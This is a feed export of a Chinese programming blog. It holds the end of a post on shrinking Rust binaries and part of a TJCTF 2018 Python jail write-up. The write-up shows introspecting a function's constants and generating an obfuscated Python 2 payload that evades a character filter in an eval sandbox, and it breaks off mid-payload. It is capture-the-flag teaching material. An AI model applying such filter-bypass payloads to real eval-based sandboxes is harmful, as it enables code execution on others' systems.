class="attr">codegen-units</span> = <span class="number">1</span></span><br></pre></td></tr></table></figure><table><thead><tr><th>优化方式</th><th>体积</th><th>变化</th></tr></thead><tbody><tr><td>无</td><td>4.70M</td><td>100%</td></tr><tr><td>strip</td><td>2.11M</td><td>44.9%</td></tr><tr><td>前文步骤</td><td>2.79M</td><td>59.4%</td></tr><tr><td>前文步骤 + strip</td><td>1.56M</td><td>33.2%</td></tr><tr><td>前文步骤 + <code>codegen-units = 1</code></td><td>2.62M</td><td>55.7%</td></tr><tr><td>前文步骤 + <code>codegen-units = 1</code> + strip</td><td>1.49M</td><td>31.7%</td></tr></tbody></table><h1 id="panic-时立刻终止"><a class="headerlink" href="#panic-时立刻终止"></a>Panic 时立刻终止</h1><blockquote><p><strong>前面的优化对程序的行为都不会产生任何影响，然而这个优化会。</strong></p></blockquote><p>众所周知，Rust 程序在 panic 时会生成栈回溯，方便定位问题。而这个 flag 会禁用这种行为——请自行权衡使用。</p><figure class="highlight toml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[profile.release]</span></span><br><span class="line"><span class="attr">panic</span> = <span class="string">'abort'</span></span><br></pre></td></tr></table></figure><table><thead><tr><th>编译方式</th><th>优化方式</th><th>体积</th><th>变化</th></tr></thead><tbody><tr><td>release</td><td>无</td><td>4.70M</td><td>100%</td></tr><tr><td>release</td><td>strip</td><td>2.11M</td><td>44.9%</td></tr><tr><td>release</td><td>前文步骤</td><td>2.62M</td><td>55.7%</td></tr><tr><td>release</td><td>前文步骤 + strip</td><td>1.49M</td><td>31.7%</td></tr><tr><td>release</td><td>前文步骤 + <code>panic = 'abort'</code></td><td>2.44M</td><td>52.0%</td></tr><tr><td>release</td><td>前文步骤 + <code>panic = 'abort'</code> + strip</td><td>1.40M</td><td>29.8%</td></tr></tbody></table><p>又减小了一点点</p><h1 id="最小化依赖"><a class="headerlink" href="#最小化依赖"></a>最小化依赖</h1><blockquote><p>上面的优化都是只用调整参数就能完成的优化，然而这个优化可能需要你改动源码<br>但是，如果做方法得当的话，这个可能会是<strong>效果最明显的方式</strong></p></blockquote><p>Rust 的中心化包管理系统用起来爽到不行，但是用外部库用起来太方便也带来了一个问题：一个小程序动不动就会带上上百个依赖……这体积怎么可能不大嘛</p><p>所以最小化你的依赖也是一个减小体积的重要方式</p><p>先看一下这个项目当前的依赖：</p><figure class="highlight toml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[dependencies]</span></span><br><span class="line"><span class="attr">regex</span> = <span class="string">"1.3.1"</span></span><br><span class="line"><span class="attr">clap</span> = &#123; version = <span class="string">"2.33.0"</span>, features = [<span class="string">"yaml"</span>] &#125;</span><br><span class="line"><span class="attr">colored</span> = <span class="string">"1.9.0"</span></span><br></pre></td></tr></table></figure><p>很少，只有三个，但是仍然有优化空间。</p><h2 id="去除不必要的依赖"><a class="headerlink" href="#去除不必要的依赖"></a>去除不必要的依赖</h2><p>首先使用命令 <code>cargo deps | dot -Tpng &gt; dep.png</code>，可以将当前依赖关系绘制成一张图。（需要用到 <a href="https://github.com/m-cat/cargo-deps" target="_blank" rel="noopener"><code>cargo-deps</code></a>和 <a href="https://graphviz.gitlab.io/download/" target="_blank" rel="noopener"><code>graphviz</code></a>）</p><p><img src="http://storage.aloxaf.cn/storage/img/dep.png?v=1" alt=""></p><p>这里面看起来最 “庞大” 的是 clap。</p><p>不过这个图也未必准确，因为 Rust 拥有条件编译，这里列出的依赖并不一定会全部用到。比如 <code>winconsole</code> 就只会在 Windows 上被编译。所以我们还要使用另一个工具 <a href="https://github.com/RazrFalcon/cargo-bloat" target="_blank" rel="noopener"><code>cargo-bloat</code></a>（为了方便看出结果，这里没有启用前面的优化）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">❯ cargo bloat --release --crates</span><br><span class="line">...</span><br><span class="line">    Finished release [optimized] target(s) <span class="keyword">in</span> 1m 06s</span><br><span class="line">    Analyzing /home/aloxaf/.cache/cargo-build/release/ren3</span><br><span class="line"></span><br><span class="line"> File  .text     Size Crate</span><br><span class="line"> 7.3%  27.3% 351.7KiB clap</span><br><span class="line"> 4.8%  17.8% 229.2KiB regex</span><br><span class="line"> 4.7%  17.6% 226.4KiB regex_syntax</span><br><span class="line"> 4.1%  15.2% 195.3KiB std</span><br><span class="line"> 2.4%   9.1% 116.5KiB yaml_rust</span><br><span class="line"> 1.5%   5.5%  70.9KiB aho_corasick</span><br><span class="line"> 0.7%   2.8%  35.5KiB [Unknown]</span><br><span class="line"> 0.4%   1.4%  17.5KiB ren3</span><br><span class="line"> 0.2%   0.7%   8.8KiB colored</span><br><span class="line"> 0.1%   0.3%   3.6KiB thread_local</span><br><span class="line"> 0.1%   0.2%   3.2KiB ansi_term</span><br><span class="line"> 0.1%   0.2%   3.2KiB memchr</span><br><span class="line"> 0.0%   0.2%   2.4KiB strsim</span><br><span class="line"> 0.0%   0.1%   1.5KiB textwrap</span><br><span class="line"> 0.0%   0.0%      28B atty</span><br><span class="line">26.7% 100.0%   1.3MiB .text section size, the file size is 4.7MiB</span><br><span class="line"></span><br><span class="line">Note: numbers above are a result of guesswork. They are not 100% correct and never will be.</span><br></pre></td></tr></table></figure><p>使用 cargo-bloat 查看各个 crate 所占体积，可以看到 clap 和 regex 加起来占了一半。</p><p>考虑到这个工具的命令行参数并不复杂，并不需要使用 clap 这种庞大的命令行参数解析库。所以要做的首先就是将 clap 去掉，换成更基础的 <a href="https://crates.io/crates/getopts" target="_blank" rel="noopener">getopts</a>。</p><p>换成 getopts 后再编译，体积再次小幅减小！</p><table><thead><tr><th>编译方式</th><th>优化方式</th><th>体积</th><th>变化</th></tr></thead><tbody><tr><td>release</td><td>无</td><td>4.70M</td><td>100%</td></tr><tr><td>release</td><td>前文步骤</td><td>2.44M</td><td>52.0%</td></tr><tr><td>release</td><td>前文步骤 + strip</td><td>1.40M</td><td>29.8%</td></tr><tr><td>release</td><td>前文步骤 + 去掉 clap</td><td>1.96M</td><td>41.8%</td></tr><tr><td>release</td><td>前文步骤 + 去掉 clap + strip</td><td>1.06M</td><td>22.6%</td></tr></tbody></table><h2 id="禁用不必要的-feature"><a class="headerlink" href="#禁用不必要的-feature"></a>禁用不必要的 feature</h2><p>这是不少人都会忽略的一点，很多 crate 默认会启用不少 feature。有些功能可能你根本没有用到，却被引入了。（这也是 cargo-deps 存在的意义）</p><p>如果这个 crate 是项目的直接依赖还好，可以在 Cargo.toml 里禁用不需要的 feature。就怕这个 crate 并不是项目的直接依赖。</p><p>举一个例子，<a href="https://github.com/image-rs/imageproc/issues/344" target="_blank" rel="noopener">imageproc#344</a>：imageproc 依赖 image，并且没有禁用默认 feature，而 image 默认启用了对所有图片格式的支持。这就导致了任何使用了 imageproc 的项目都会附带一个开启了所有 feature 的 image。即使你在自己的 Cargo.toml 中禁用这些 feature 也无济于事，因为 feature 是取<strong>并集</strong>的。<br>如果你也遇到了这种情况建议给直接库作者提 issue 或者 PR。</p><p>回到我们的项目中来，getopts 和 colored 都十分精简，没有多余的 feature，但 regex 还是有可优化之处的。阅读 regex 的<a href="https://github.com/rust-lang/regex/blob/master/Cargo.toml#L37-L105" target="_blank" rel="noopener">features 列表</a>，发现默认启用了 <code>[&quot;std&quot;, &quot;perf&quot;, &quot;unicode&quot;]</code></p><ul><li>std，暂且不谈，而且看描述这和 feature 目前对于 regex 来说是必需的</li><li>perf，提供性能优化</li><li>unicode，顾名思义，提供完整的 Unicode 支持比如 <code>\p{Letter}</code>、<code>\p{Emoji}</code></li></ul><p>作为一个简单的文件夹改名工具，并不会用到复杂的正则，也不需要匹配奇怪的 Unicode 字符。所以我们可以禁用这两个 feature</p><figure class="highlight toml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[dependencies]</span></span><br><span class="line"><span class="attr">regex</span> = &#123; version = <span class="string">"1.3.1"</span>, default-features = <span class="literal">false</span>, features = [<span class="string">"std"</span>] &#125;</span><br></pre></td></tr></table></figure><p>此时再编译</p><table><thead><tr><th>编译方式</th><th>优化方式</th><th>体积</th><th>变化</th></tr></thead><tbody><tr><td>release</td><td>无</td><td>4.70M</td><td>100%</td></tr><tr><td>release</td><td>前文步骤</td><td>1.96M</td><td>41.8%</td></tr><tr><td>release</td><td>前文步骤  + strip</td><td>1.06M</td><td>22.6%</td></tr><tr><td>release</td><td>前文步骤 + 禁用 feature</td><td>1.26M</td><td>26.8%</td></tr><tr><td>release</td><td>前文步骤 + 禁用 feature + strip</td><td>0.42M</td><td>8.94%</td></tr></tbody></table><p>巨大进步！strip 后的程序体积终于降低到了 KB 级别！！</p><h1 id="libstd-优化"><a class="headerlink" href="#libstd-优化"></a>libstd 优化</h1><blockquote><p>终于要对 libstd 下手了</p></blockquote><p>Rust 的工具链自带了预编译的标准库（libstd)，这样开发者就不用在每次编译 Rust 程序的时候都编译一遍 libstd，而是直接把 libstd 静态链接进去就行。</p><p>好处是很明显的，然而坏处也是很明显的：</p><ol><li>预编译的 libstd 着重优化速度而不是体积</li><li>即使是 LTO 也无法移除 libstd 中的某些我们用不到的代码</li></ol><p>这时就轮到 <a href="https://github.com/japaric/xargo" target="_blank" rel="noopener">Xargo</a> 出场了——一个可以方便地为你的程序单独编译 libstd 的工具。</p><p>在项目根目录下创建 <code>Xargo.toml</code>（不需要删掉原来的 <code>Cargo.toml</code>），写入：</p><figure class="highlight toml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[dependencies]</span></span><br><span class="line"><span class="attr">std</span> = &#123; default-features = <span class="literal">false</span> &#125;</span><br></pre></td></tr></table></figure><p>然后编译（target 请自行调整）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xargo build --target x86_64-unknown-linux-gnu --release</span><br></pre></td></tr></table></figure><table><thead><tr><th>编译方式</th><th>优化方式</th><th>体积</th><th>变化</th></tr></thead><tbody><tr><td>release</td><td>无</td><td>4.70M</td><td>100%</td></tr><tr><td>release</td><td>前文步骤</td><td>1.26M</td><td>26.8%</td></tr><tr><td>release</td><td>前文步骤  + strip</td><td>0.42M</td><td>8.94%</td></tr><tr><td>release</td><td>前文步骤 + 裁剪 std</td><td>378KB</td><td>7.85%</td></tr><tr><td>release</td><td>前文步骤 + 裁剪 std  + strip</td><td>266KB</td><td>5.53%</td></tr></tbody></table><p>再次获得了不小的进步</p><h2 id="移除-panic-相关字符串"><a class="headerlink" href="#移除-panic-相关字符串"></a>移除 <code>panic</code> 相关字符串</h2><p>即使已经在 <code>Cargo.toml</code> 指定了 <code>panic = 'abort'</code>，<code>rustc</code> 默认还是会生成相关的格式化字符串。我们可以通过 feature <code>panic_immediate_abort</code> 来禁止这个行为</p><figure class="highlight toml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[dependencies]</span></span><br><span class="line"><span class="attr">std</span> = &#123; default-features = <span class="literal">false</span>, features=[ <span class="string">"panic_immediate_abort"</span> ] &#125;</span><br></pre></td></tr></table></figure><table><thead><tr><th>编译方式</th><th>优化方式</th><th>体积</th><th>变化</th></tr></thead><tbody><tr><td>release</td><td>无</td><td>4.70M</td><td>100%</td></tr><tr><td>release</td><td>前文步骤</td><td>378KB</td><td>7.85%</td></tr><tr><td>release</td><td>前文步骤 + strip</td><td>266KB</td><td>5.53%</td></tr><tr><td>release</td><td>前文步骤 + <code>panic_immediate_abort</code></td><td>293KB</td><td>6.09%</td></tr><tr><td>release</td><td>前文步骤 + <code>panic_immediate_abort</code>+ strip</td><td>210KB</td><td>4.36%</td></tr></tbody></table><p>再次进步了一点点</p><h1 id="upx-压缩"><a class="headerlink" href="#upx-压缩"></a>UPX 压缩</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upx -9 target/x86_64-unknown-linux-gnu/release/ren3</span><br></pre></td></tr></table></figure><p>都懂的 XD</p><table><thead><tr><th>编译方式</th><th>优化方式</th><th>体积</th><th>变化</th></tr></thead><tbody><tr><td>release</td><td>无</td><td>4.70M</td><td>100%</td></tr><tr><td>release</td><td>前文步骤</td><td>293KB</td><td>6.09%</td></tr><tr><td>release</td><td>前文步骤 + strip</td><td>210KB</td><td>4.36%</td></tr><tr><td>release</td><td>前文步骤 + strip + upx</td><td>98.8KB</td><td>2.06%</td></tr></tbody></table><p>体积再次大幅减小！</p><h1 id="结尾"><a class="headerlink" href="#结尾"></a>结尾</h1><p>从 4.70MB 到 98.8 KB，非常可以了。我已经没有遗憾了（</p><p>虽然再往后还可以使用 <code>#![no_std]</code> 直接去除 libstd，不过这个限制太大，只有你使用的所有的 crate 都支持 nostd 时才能这样做，而且限制了大量 feature。一般只有嵌入式项目或者 wasm 项目中才会用到，而我想要的是对与大部分 Rust 项目来说都能使用的技巧，所以就不谈这个了。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;体积狂魔の执念，记录一下以免忘记。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2019-11-12 更新：&lt;/strong&gt; 自这篇文章发表后已经过了一年，Rust 发生了许多变化，比如不再自带 Jemalloc 作为内存分配器。因此更新一下文章，参考了一个新项目 &lt;a href=&quot;https://github.com/johnthagen/min-sized-rust&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;min-sized-rust&lt;/a&gt; 进行了更多的优化。&lt;/p&gt;
    
    </summary>
    
    
      <category term="rust" scheme="https://www.aloxaf.com/categories/rust/"/>
    
    
      <category term="rust" scheme="https://www.aloxaf.com/tags/rust/"/>
    
  </entry>
  
  <entry>
    <title>TJCTF 2018 中两道 Python Jail 的解法</title>
    <link href="https://www.aloxaf.com/2018/08/tjctf_pythonjail/"/>
    <id>https://www.aloxaf.com/2018/08/tjctf_pythonjail/</id>
    <published>2018-08-11T04:23:25.000Z</published>
    <updated>2018-08-11T04:23:25.000Z</updated>
    
    <content type="html"><![CDATA[<p>感谢 M4x 师傅推荐了这个比赛, 虽然是面向美国高中生, 不过打了以后还是有点收获的.<br><s>同时内心受到一万点暴击伤害</s></p><p>尤其是两道 Python jail, 非常硬却失挺.<br>(下载地址在文末)</p><a id="more"></a><h1 id="mirror-mirror"><a class="headerlink" href="#mirror-mirror"></a>Mirror Mirror</h1><p>连进去以后会收到一个提示</p><blockquote><p>Hi! Are you looking for the flag? Try get_flag() for free flags. Remember, wrap your input in double quotes. Good luck!</p></blockquote><p>不多说废话了, 这个环境无法 import, 也过滤了 双下划线, 和 getattr, eval, execfile, reload, file 等大量有用的函数,<br>经典的 payload 基本无法使用.</p><p>题目提示使用 <code>get_flag()</code>, 而且强调参数要包裹在两层括号中.<br>然而试一下会发现完全没有卵用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; get_flag(&apos;&quot;a&quot;&apos;)</span><br><span class="line">a is not a valid character</span><br><span class="line">&gt;&gt;&gt; get_flag(&apos;&quot;1&quot;&apos;)</span><br><span class="line">1 is not a valid character</span><br><span class="line">&gt;&gt;&gt; get_flag(&apos;&quot;[&quot;&apos;)</span><br><span class="line">You didn&apos;t guess the value of my super_secret_string</span><br><span class="line">&gt;&gt;&gt; get_flag(&apos;[&apos;)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;&lt;console&gt;&quot;, line 1, in &lt;module&gt;</span><br><span class="line">  File &quot;/home/app/problem.py&quot;, line 23, in get_flag</span><br><span class="line">    if(eval(input) == super_secret_string):</span><br><span class="line">  File &quot;&lt;string&gt;&quot;, line 1</span><br><span class="line">    [</span><br><span class="line">    ^</span><br><span class="line">SyntaxError: unexpected EOF while parsing</span><br></pre></td></tr></table></figure><h2 id="我猜想的标准解法"><a class="headerlink" href="#我猜想的标准解法"></a>我猜想的标准解法</h2><p>通过 <code>get_flag.func_code.co_consts</code> 拿到函数内的常量, 得到 super_secret_string 的值.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>get_flag.func_code.co_consts</span><br><span class="line">(<span class="literal">None</span>, <span class="string">'this_is_the_super_secret_string'</span>, <span class="number">48</span>, <span class="number">57</span>, <span class="number">65</span>, <span class="number">90</span>, <span class="number">97</span>, <span class="number">122</span>, <span class="number">44</span>, <span class="number">95</span>, <span class="string">' is not a valid character'</span>, <span class="string">'%\xcb'</span>, <span class="string">"You didn't guess the value of my super_secret_string"</span>)</span><br></pre></td></tr></table></figure><p>然后发现后面那一串数字代表的正好是 <code>09AZaz,_</code> 这几个字符,<br>于是判断过滤了 <code>0~9</code>, <code>A-Z</code> 和 <code>,</code> <code>_</code> 这两个字符.</p><p>再联想到题目让我们用两层括号和前面的报错, 判断应该是对我们的输入进行了eval, 那么具体思路就是:<br>不用 <code>0~9</code>, <code>A-Z</code> 和 <code>,</code> <code>_</code>  构造一个字符串 s, 使 <code>eval(s) == 'this_is_the_super_secret_string'</code>.</p><p>实现的方法是个挺著名的技巧, Google 搜 python jail 就能很轻松地搜到.<br><a href="http://wapiflapi.github.io/2013/04/22/plaidctf-pyjail-story-of-pythons-escape/" target="_blank" rel="noopener">plaidctf-pyjail-story-of-pythons-escape</a></p><p>简单地讲一下这篇文章讲了啥 (<strong>仅限Python2</strong>):</p><p>在 Python2 中, 利用 <code>[] &lt; []</code> 可以得到 False, <code>{} &lt; []</code> 可以得到 True (都是什么鬼). 再利用 True 和 False 在进行数学运算时表现类似 1 和 0 的特性, 就可以通过运算得到任意数字. 作者给出了一个脚本来进行这种转换.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">brainfuckize</span><span class="params">(nb)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> nb <span class="keyword">in</span> [<span class="number">-2</span>, <span class="number">-1</span>, <span class="number">0</span>, <span class="number">1</span>]:</span><br><span class="line">        <span class="keyword">return</span> [<span class="string">"~(&#123;&#125;&lt;[])"</span>, <span class="string">"~([]&lt;[])"</span>,</span><br><span class="line">                 <span class="string">"([]&lt;[])"</span>,  <span class="string">"(&#123;&#125;&lt;[])"</span>][nb+<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> nb % <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"~%s"</span> % brainfuckize(~nb)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"(%s&lt;&lt;(&#123;&#125;&lt;[]))"</span> % brainfuckize(nb/<span class="number">2</span>)</span><br></pre></td></tr></table></figure><p>有了数字, 我们就可以利用 <code>&quot;%c&quot; % n</code> 这种方式来得到字符了,  不过这个地方 c 仍然是字母, 必须再想办法换掉.</p><p>作者提出了这种方式来获取 <code>%c</code> :   <code>`'%\xcb'`[1::3]</code> , 这是一个十分巧妙的方式. 首先 <code>'%\xcb'</code> 代表了两个字符, <code>%</code> 和 <code>\xcb</code> , 这两者都不在过滤列表内 ( 可以用 <code>[i for i in &quot;`'%\xca'`&quot;]</code>验证一下), 然后, 利用 ``(即repr的语法糖) 可以再次得到这串字符串的原始形式(相当于 eval 的反函数), 即由<code>' % \ x c b '</code> 七个字符组成的字符串. 现在再用下标将他们取出, 就能得到 <code>%c</code> 了, 然后就可以愉快地得到任意字符了.</p><p>接下来要把字符拼接成字符串, 对于本题来说我觉得直接 <code>+</code> 就可以了, 不过作者似乎对 repr 情有独钟, 采用了 <code>`['a', 'b', 'c', 'd']`[2::5]</code> 这种方式来得到字符串 <code>abcd</code> ...</p><p>这个地方我们用<code>+</code>拼接, 直接给出 payload 的生成代码. <span style="background-color: #555">应该没人打算手写吧</span></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'+'</span>.join([<span class="string">"`'%\xcb'`[&#123;&#125;&lt;[]::~(~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))] % "</span> + brainfuckize(ord(i)) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">'this_is_the_super_secret_string'</span>])</span><br></pre></td></tr></table></figure><p>解释: 先用 <code>brainfuckize(ord(i))</code> 得到每个字符对应 ASCII 码的 brainfuck 形式. 再拼接在 <code>&quot;`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))] % &quot;</code> 后面, 就得到了一段 eval 后可以得到对应字符的代码, 然后把这一堆代码用<code>+</code> 拼接起来就可以得到最终 payload 了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"`'%\xcb'`[&#123;&#125;&lt;[]::~(~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))] % ((~(~(~((~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))+`'%\xcb'`[&#123;&#125;&lt;[]::~(~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))] % (((~(~(~(~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))+`'%\xcb'`[&#123;&#125;&lt;[]::~(~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))] % ~(~((~(~(~(~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))+`'%\xcb'`[&#123;&#125;&lt;[]::~(~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))] % ~((~((~((~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))+`'%\xcb'`[&#123;&#125;&lt;[]::~(~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))] % ~(((((~((&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))+`'%\xcb'`[&#123;&#125;&lt;[]::~(~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))] % ~(~((~(~(~(~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))+`'%\xcb'`[&#123;&#125;&lt;[]::~(~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))] % ~((~((~((~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))+`'%\xcb'`[&#123;&#125;&lt;[]::~(~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))] % ~(((((~((&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))+`'%\xcb'`[&#123;&#125;&lt;[]::~(~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))] % ((~(~(~((~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))+`'%\xcb'`[&#123;&#125;&lt;[]::~(~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))] % (((~(~(~(~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))+`'%\xcb'`[&#123;&#125;&lt;[]::~(~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))] % ~(~(~(~((~(~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))+`'%\xcb'`[&#123;&#125;&lt;[]::~(~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))] % ~(((((~((&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))+`'%\xcb'`[&#123;&#125;&lt;[]::~(~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))] % ~((~((~((~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))+`'%\xcb'`[&#123;&#125;&lt;[]::~(~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))] % ~(~(~(~(~((~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))+`'%\xcb'`[&#123;&#125;&lt;[]::~(~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))] % ((((~((~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))+`'%\xcb'`[&#123;&#125;&lt;[]::~(~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))] % 